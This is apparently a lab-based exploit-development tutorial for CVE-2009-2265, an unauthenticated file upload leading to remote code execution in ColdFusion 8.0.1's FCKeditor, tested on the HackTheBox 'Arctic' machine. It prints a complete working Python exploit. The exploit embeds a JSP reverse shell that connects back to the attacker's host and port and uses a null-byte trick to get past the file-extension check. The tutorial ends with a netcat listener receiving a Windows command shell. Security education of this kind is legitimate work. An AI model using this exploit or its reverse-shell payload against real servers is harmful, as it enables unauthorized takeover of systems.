# ExploitDev Journey #1 | CVE-2009-2265 | ColdFusion 8.0.1 - Arbitrary File Upload / RCE 
Original: https://www.exploit-db.com/exploits/16788 <br>

**Exploit name:** ColdFusion 8.0.1 - Arbitrary File Upload / RCE <br>
**CVE**: 2009-2265 <br>
**Lab**: Arctic - HackTheBox

### Description
This exploit allows unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exist in FCKeditor and the path to upload files is unrestricted.

<br>

### How it works
According to my own understanding the vulnerability was discovered after users logged into the admin panel and tested out the upload functionality, it could be from there when the researcher found out that the path is not protected or does not require authentication.

The path that we are talking about is the following:
`/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=`

A good example to understand this would be to look into @login_required decorator of Flask framework, this decorator protects a path in a way that can only be accessed by logged in users, more can be found [here](https://flask-login.readthedocs.io/en/latest/#flask_login.login_required).

ColdFusion is written in Java, so I assume there was a functionality within java same as @login_required decorator that restricted paths but it could be that the developer forgot to restrict that path.

<br>

### Writing the exploit
> `gen_random_charset()`

<br>

It's not necessary but it makes things work more smoothly if we create each shell with a unique name, that's why I am using `gen_random_charset()` function to create a random set of characters, this set is going to have uppercase and lowercase alphabets and it's size is going to be 10, that means 10 random characters combined.

Then I simply store the value returned by this function to a variable outside other functions so that it's accessible from inside other functions:
```py
shell_name = gen_random_charset()
```
This is also called a global variable, you can also explicitly specify that it's global using the `global` keyword but it's not necessary here.

<br>

> `def shell_upload(rhost, lhost, lport):`

This function takes 3 arguments, the target URL, your listener's IP and port. There are a few things within this function that are important to understand.
The first is a string that contains a java reverse shell code (generated with msfvenom):
```py
shell_content = '<%@page import="java.lang.*"%> <%@page import="java.util.*"%> <%@page import="java.io.*"%> <%@page import="java.net.*"%> <% class StreamConnector extends Thread { InputStream p1; OutputStream tR; StreamConnector( InputStream p1, OutputStream tR ) { this.p1 = p1; this.tR = tR; } public void run() { BufferedReader wA = null; BufferedWriter nfR = null; try { wA = new BufferedReader( new InputStreamReader( this.p1 ) ); nfR = new BufferedWriter( new OutputStreamWriter( this.tR ) ); char buffer[] = new char[8192]; int length; while( ( length = wA.read( buffer, 0, buffer.length ) ) > 0 ) { nfR.write( buffer, 0, length ); nfR.flush(); } } catch( Exception e ){} try { if( wA != null ) wA.close(); if( nfR != null ) nfR.close(); } catch( Exception e ){} } } try { String ShellPath; if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) { ShellPath = new String("/bin/sh"); } else { ShellPath = new String("cmd.exe"); } Socket socket = new Socket( "'+lhost+'", '+lport+' ); Process process = Runtime.getRuntime().exec( ShellPath ); ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start(); ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start(); } catch( Exception e ) {} %>'
```

As you can see in the code, I have concatenated lhost & lport in the string so that users won't have to manually change the contents of the shell every time.

In almost all of my exploits I use python's `requests` module to send requests and in this exploit, we need to send a `POST` request and it's format is something like this:
```py
upload = requests.post(url=url, files=file, verify=False, timeout=30)
```

It takes 3 arguments, `verify` is not always necessary but it is a good practice to include it so that we don't have to verify the security of some websites, this helps because most websites use insecure or mis-configured connections.

The most important parts are `url` and `files`, the `files` parameter or argument takes a dictionary, in our exploit we need to specify:
* the key to pass our files into
* the name of the file
* the contents of the file
* content type
* disposition type

Here is how it looks like in code:
```py
file = {"newfile": (f'{shell_name}.txt', shell_content, 'application/x-java-archive', {'Content-Disposition': 'form-data'})}
```

As you can see the `key` to pass our files into is `newfile`, many times it's either `newfile` or `file` or `upload`, it isn't something you can guess, as you go through this long exploit development journey you will understand how we know what type of `key` we should pass.

Next you have to specify the shell name which is a random text string concatenated with `.txt` extension. then comes another variable named `shell_content` which basically contains that reverse shell code. Using `.txt` extension allows us to just bypass file upload restrictions but later we upload our shell with `.jsp` extension.

Next we have to specify the type of contents being sent which is a java archive and our data is sent in form of a `form-data`.

We also have another very important variable here which is URL:
```py
url = f"{rhost}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{shell_name}.jsp%00"
```

Using python formatting, I am passing `rhost` or the target URL to this variable, I am also passing a unique `shell_name` that ends with `.jsp` extension and a `nullbyte` character, this character is also called nullbyte termination character which terminates a string so the string is read as `shell_name.jsp` and then the application detects a string terminator and that's where it stops and you can upload your shell as `shell.jsp` which is also a bypass to upload files that are not allowed to be uploaded.

Then there is another variable with a pre-set value that determines whether our shell upload was successful or not:
```py
upload_status = False
```
By default it is set to `False` but depending on our conditional statements it's value can change to `True`.


After all that, we have a try:except clause to execute and catch exceptions if there are any:
```py
try:
    upload = requests.post(url=url, files=file, verify=False, timeout=30)
    if not 'The form field NewFile did not contain a file.' in upload.text and not 'An exception occurred when performing a file operation' in upload.text:
        upload_status = True
    else:
        upload_status = False
except Exception as e:
    print(e)
    sys.exit()
```

In this first line we upload the shell through a `POST` request and then we have two conditions to determine whether our upload was successful or not. When we send the `POST` request, we get a response in various forms but here I explicitly take that response in form of `text` then I check if the string `The form field NewFile did not contain a file.` & `An exception occurred when performing a file operation` is NOT inside response text.

The string that I am checking is self explanatory, recall that `NewFile` is the same `key` that we used earlier in `file` variable. Then we change the value of `upload_status` to `True`.

If something goes wrong or if `The form field NewFile did not contain a file.` & `An exception occurred when performing a file operation` is found in website's response then `upload_status` remains `False`.

The exception handler will throw exceptions if there are any, such as timeout error if our request takes longer than 30 seconds, we will get a timeout error and then it simply exits the program.

Our function finally returns the `upload_status` which is either `True` or `False`.

<br>

> `upload = shell_upload(rhost=rhost, lhost=lhost, lport=lport)`

This is how we call the function, the values are taken from the following variables:
```py
rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
```

Using system arguments we can pass values to our program directly through our terminal, `sys.argv[0]` is the name of your program and the rest are values followed after program's name, in this case after `exploit.py`.

The following code gives users instructions on how to use the program & what command-line arguments to pass with an example:
```py
if len(sys.argv) != 4:
    print("Usage: python3 exploit.py <target_host> <listener_ip> <listener_port>")
    print("Example: python3 exploit.py http://10.10.20.15:80 127.0.0.1 1337")
    sys.exit()
```

<br>

> `if upload == True:`

This is the final if-else clause that checks if the upload was successful or not. If not it throws an error and exits:
```py
if upload == True:
    print(f"[ + ] Upload successful, uploaded to:\n[>>>] {rhost}/userfiles/file/{shell_name}.jsp")
    print("[...] Opening the shell, hold your beer...")
    try:
        requests.get(url=f'{rhost}/userfiles/file/{shell_name}.jsp', timeout=10)
    except Exception as error:
        print(error)
        sys.exit()
    print("[***] Check your listener!")
else:
    print("[ - ] Shell upload failed, exiting.")
    sys.exit()
```

The upload directory for shell is `/userfiles/file/`, I have used string formatting to pass in `rhost` and name of the shell.
Another important piece is that in order to get a reverse shell you must open the shell or trigger it and we do that by sending a `GET` request to shell:
```py
requests.get(url=f'{rhost}/userfiles/file/{shell_name}.jsp', timeout=10)
```

<br>

### Testing the exploit

Here is what I get when I ran the exploit without passing any arguments:
```
$ python3 exploit.py                                              
Usage: python3 exploit.py <target_host> <listener_ip> <listener_port>
Example: python3 exploit.py http://10.10.20.15:80 127.0.0.1 1337
```

Here is what happens when I don't pass enough arguments:
```
$ python3 exploit.py http://10.129.170.199:8500                   
Usage: python3 exploit.py <target_host> <listener_ip> <listener_port>
Example: python3 exploit.py http://10.10.20.15:80 127.0.0.1 1337
```

Here is what happens when I run the program with more than required arguments:
```
$ python3 exploit.py http://10.129.170.199:8500 10.10.10.10 1338 z
Usage: python3 exploit.py <target_host> <listener_ip> <listener_port>
Example: python3 exploit.py http://10.10.20.15:80 127.0.0.1 1337
```

Here is what happens when I run the program with enough arguments as instructed by it's usage:
```
$ python3 exploit.py http://10.129.170.199:8500 10.10.10.10 1338  
[ + ] Upload successful, uploaded to:
[>>>] http://10.129.170.199:8500/userfiles/file/oVKtoHXafF.jsp
[...] Opening the shell, hold your beer...
[***] Check your listener!
```

The listener:
```
$ nc -lnvp 1338                                                   
Listening on 0.0.0.0 1338
Connection received on 10.129.170.199 49754
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```
<br>

### Final thoughts
Most of what you learned here will be used in the next exploits, it's advised to completely understand this exploit first before moving forward, it gives you a broad understanding of how exploits really work or developed. In the next series of exploit documentations, I will focus on new things and skip through the things that are already explained here.
